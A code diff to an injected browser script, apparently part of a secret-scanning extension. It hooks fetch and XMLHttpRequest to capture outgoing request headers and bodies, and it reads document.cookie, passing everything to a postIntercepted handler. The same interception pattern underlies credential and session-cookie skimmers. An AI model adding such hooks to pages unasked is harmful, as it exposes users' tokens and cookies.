@@ -35,10 +35,38 @@
   }
 
   // =========================================================================
-  // 1. Patch fetch() — body + headers
+  // 1. Patch fetch() — request + response headers & body
   // =========================================================================
   const originalFetch = window.fetch;
   window.fetch = async function (...args) {
+    // Scan outgoing request headers and body
+    try {
+      const url = (typeof args[0] === 'string' ? args[0] : args[0]?.url) || '';
+      const opts = args[1] || {};
+
+      // Request headers
+      if (opts.headers) {
+        const headerLines = [];
+        if (opts.headers instanceof Headers) {
+          for (const [name, value] of opts.headers.entries()) {
+            headerLines.push(`${name}: ${value}`);
+          }
+        } else if (typeof opts.headers === 'object') {
+          for (const [name, value] of Object.entries(opts.headers)) {
+            headerLines.push(`${name}: ${value}`);
+          }
+        }
+        if (headerLines.length > 0) {
+          postIntercepted(url, headerLines.join('\n'), 'request:fetch');
+        }
+      }
+
+      // Request body
+      if (typeof opts.body === 'string' && opts.body.length >= 10) {
+        postIntercepted(url, opts.body, 'request:fetch');
+      }
+    } catch {}
+
     const response = await originalFetch.apply(this, args);
     try {
       const url = (typeof args[0] === 'string' ? args[0] : args[0]?.url) || '';
@@ -80,6 +108,14 @@
   };
 
   XMLHttpRequest.prototype.send = function (...args) {
+    // Scan outgoing request body
+    try {
+      const body = args[0];
+      if (typeof body === 'string' && body.length >= 10) {
+        postIntercepted(this.__ssUrl || '', body, 'request:xhr');
+      }
+    } catch {}
+
     this.addEventListener('load', function () {
       try {
         const contentType = this.getResponseHeader('content-type') || '';
@@ -289,14 +325,26 @@
     }
   }
 
+  // =========================================================================
+  // 6. Scan cookies
+  // =========================================================================
+  function scanCookies() {
+    const cookies = document.cookie;
+    if (cookies && cookies.length >= 10) {
+      postIntercepted(window.location.href, cookies, 'cookie');
+    }
+  }
+
   // Trigger after DOM is fully loaded so all script/link tags are present
   if (document.readyState === 'complete') {
     scanExternalScripts();
     scanExternalStylesheets();
+    scanCookies();
   } else {
     window.addEventListener('load', () => {
       scanExternalScripts();
       scanExternalStylesheets();
+      scanCookies();
     }, { once: true });
   }
 
